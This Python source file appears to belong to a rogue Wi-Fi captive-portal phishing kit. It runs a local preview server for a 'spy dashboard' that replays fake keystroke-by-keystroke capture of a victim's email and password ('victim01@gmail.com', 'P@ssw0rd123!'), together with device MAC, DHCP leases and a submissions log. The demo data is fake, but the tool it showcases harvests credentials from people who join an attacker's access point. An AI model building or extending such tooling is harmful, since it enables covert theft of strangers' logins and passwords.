#!/usr/bin/env python3
"""Preview-only spy dashboard — no root, no hostapd, no portal_server needed.

Shows exactly how the new spy dashboard (spy_view.py PAGE with the
phone.html iPhone 16 body) looks, with fake live typing so the phone
keyboard / finger / Dynamic Island animate.

Usage:
    python3 preview_spy.py [--port 8766] [--portal my-custom-web-ui]
    # then open: http://127.0.0.1:8766/
"""
import argparse
import json
import mimetypes
import os
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import spy_view as real

REPO_ROOT = os.path.dirname(os.path.abspath(__file__))
T0 = time.time()

DEMO_IP = "192.168.4.10"
DEMO_MAC = "AA:BB:CC:DD:EE:01"
EMAIL_FULL = "victim01@gmail.com"
PASS_FULL = "P@ssw0rd123!"

# 26s loop: 0-9s type email, 9-11s pause, 11-20s type password, 20-26s idle
LOOP = 26


def _slice(text, t, speed=0.28):
    n = int(t / speed)
    return text[:max(0, min(len(text), n))]


def fake_live():
    t = (time.time() - T0) % LOOP
    if t < 9:
        live_field = "email"
        live_value = _slice(EMAIL_FULL, t)
        ago = 1
        fields = {"email": live_value, "password": ""}
    elif t < 11:
        live_field = "email"
        live_value = EMAIL_FULL
        ago = 8
        fields = {"email": EMAIL_FULL, "password": ""}
    elif t < 20:
        live_field = "password"
        live_value = _slice(PASS_FULL, t - 11)
        ago = 1
        fields = {"email": EMAIL_FULL, "password": live_value}
    else:
        live_field = "password"
        live_value = PASS_FULL
        ago = 22
        fields = {"email": EMAIL_FULL, "password": PASS_FULL}
    tape = [
        {"t": time.time() - 2, "epoch": time.time() - 2, "ip": DEMO_IP,
         "field": live_field, "key": live_value[-1:] if live_value else "",
         "type": "input", "value": live_value},
    ]
    return {
        DEMO_IP: {
            "mac": DEMO_MAC,
            "page": "/login",
            "title": "Preview portal",
            "active_ago": ago,
            "active_field": live_field,
            "live_field": live_field,
            "live_value": live_value,
            "fields": fields,
            "tape": tape,
            "events": 42,
        }
    }


def fake_history():
    live = fake_live()[DEMO_IP]
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    return {
        DEMO_IP: {
            "mac": DEMO_MAC,
            "page": "/login",
            "title": "Preview portal",
            "first_ts": now,
            "last_ts": now,
            "last_epoch": time.time(),
            "events": 42,
            "fields": live["fields"],
        }
    }


def fake_tape(since=0.0, limit=100):
    live = fake_live()[DEMO_IP]
    rows = []
    base = time.time() - 5
    v = live["live_value"] or ""
    for i, ch in enumerate(v[-8:]):
        e = base + i * 0.3
        if e > since:
            rows.append({"t": e, "epoch": e, "ts": time.strftime("%H:%M:%S", time.localtime(e)),
                         "ip": DEMO_IP, "field": live["live_field"],
                         "key": ch, "type": "input", "value": v[:len(v) - len(v[-8:]) + i + 1]})
    return rows[-limit:]


def fake_activity():
    now = time.localtime()
    labels = ["%02d:00" % ((now.tm_hour - k) % 24) for k in range(23, -1, -1)]
    counts = [0] * 24
    counts[-1] = 12
    counts[-2] = 7
    counts[-3] = 3
    days_labels = ["day-%d" % i for i in range(14)]
    days_counts = [0] * 13 + [42]
    return {"events": 42,
            "hours": {"labels": labels, "counts": counts},
            "days": {"labels": days_labels, "counts": days_counts}}


FAKE_SUBS = "2026-10-06 02:00:01 192.168.4.10 email=victim01@gmail.com password=P@ssw0rd123!\n"


class Handler(BaseHTTPRequestHandler):
    server_version = "SpyPreview/1.0"

    def log_message(self, fmt, *args):
        pass

    def send_data(self, data, ctype, status=200):
        body = data.encode() if isinstance(data, str) else data
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path, qs = parsed.path, parsed.query
        q = urllib.parse.parse_qs(qs)
        if path in ("/", "/index.html"):
            live = fake_live()
            hist = fake_history()
            # minimal first paint — JS polls replace it live
            live_rows = '<div class="dev typing"><div class="devhead"><span class="ip">preview-phone · %s</span><span class="mac">%s</span><span class="tag"><span class="badge b-green">TYPING</span></span></div><div class="devwhere">typing in <b>email</b> @ /login</div></div>' % (DEMO_IP, DEMO_MAC)
            hist_rows = "".join(
                '<tr><td class="when">now</td><td class="ip">preview-phone<br><span style="color:var(--faint);font-size:11px">%s</span></td><td class="fd">FIELD<br><span style="font-size:12px">%s</span></td><td class="vl">%s</td><td class="pg">Preview portal<br>/login</td></tr>'
                % (DEMO_MAC, k, v) for k, v in hist[DEMO_IP]["fields"].items()
            )
            sub_rows = '<div class="subrow">%s</div>' % FAKE_SUBS.strip()
            page = (real.PAGE.replace("%%CONN%%", "PREVIEW MODE — fake feed, no root needed")
                    .replace("%%LIVE_ROWS%%", live_rows)
                    .replace("%%HIST_ROWS%%", hist_rows)
                    .replace("%%SUB_ROWS%%", sub_rows))
            self.send_data(page, "text/html")
        elif path == "/api/live":
            self.send_data(json.dumps(fake_live()).encode(), "application/json")
        elif path == "/api/history":
            self.send_data(json.dumps(fake_history()).encode(), "application/json")
        elif path == "/api/tape":
            try:
                since = float(q.get("since", ["0"])[0])
            except ValueError:
                since = 0.0
            try:
                limit = int(q.get("limit", ["100"])[0])
            except ValueError:
                limit = 100
            self.send_data(json.dumps(fake_tape(since, limit)).encode(), "application/json")
        elif path == "/api/leases":
            self.send_data(json.dumps({DEMO_IP: "preview-phone"}).encode(), "application/json")
        elif path == "/api/submissions":
            self.send_data(FAKE_SUBS.encode(), "text/plain")
        elif path == "/api/activity":
            self.send_data(json.dumps(fake_activity()).encode(), "application/json")
        elif path == "/api/portal-info":
            try:
                pdir, pname = real.get_portal_dir(self.server.cfg.get("portal") if self.server.cfg.get("portal") else None)
                pentry = real.resolve_portal_entry(pdir)
                self.send_data(json.dumps({"portal": pname, "entry": pentry, "ssid": "PREVIEW", "gateway": "192.168.4.1"}).encode(), "application/json")
            except Exception as e:
                self.send_data(json.dumps({"error": str(e)}).encode(), "application/json", 500)
        elif path == "/api/portal":
            try:
                if self.server.cfg.get("portal"):
                    # temporarily force portal dir via basename
                    real_portal = real.get_active_portal_name
                    real.get_active_portal_name = lambda: self.server.cfg["portal"]
                    try:
                        _n, _e, data = real.load_portal_entry_html()
                    finally:
                        real.get_active_portal_name = real_portal
                else:
                    _n, _e, data = real.load_portal_entry_html()
                self.send_data(data, "text/html")
            except Exception as e:
                self.send_data(("preview error: %s" % e).encode(), "text/plain", 500)
        elif path == "/portal-files/" or path.startswith("/portal-files/"):
            # delegate to real spy_view static file logic (same-origin portal assets)
            try:
                # reuse real handler logic by faking minimal server.cfg
                fake_self = self
                # resolve portal dir
                pname = self.server.cfg.get("portal") or real.get_active_portal_name()
                pdir, _ = real.get_portal_dir(pname)
                rel = urllib.parse.unquote(path[len("/portal-files/"):])
                if not rel:
                    _n, _e, data = real.load_portal_entry_html()
                    self.send_data(data, "text/html")
                    return
                safe = os.path.normpath(rel)
                if safe.startswith("..") or os.path.isabs(safe):
                    self.send_error(403)
                    return
                full = os.path.join(pdir, safe)
                if not os.path.isfile(full):
                    self.send_error(404)
                    return
                ctype, _ = mimetypes.guess_type(full)
                with open(full, "rb") as f:
                    self.send_data(f.read(), ctype or "application/octet-stream")
            except Exception:
                self.send_error(404)
        else:
            self.send_error(404)


def main():
    ap = argparse.ArgumentParser(description="Preview spy dashboard with fake feed")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8766)
    ap.add_argument("--portal", default="", help="portal folder name to preview (default: active)")
    args = ap.parse_args()
    srv = ThreadingHTTPServer((args.host, args.port), Handler)
    srv.cfg = {"portal": args.portal}
    print("Preview spy dashboard on http://%s:%d/  (fake feed, no root)" % (args.host, args.port), flush=True)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
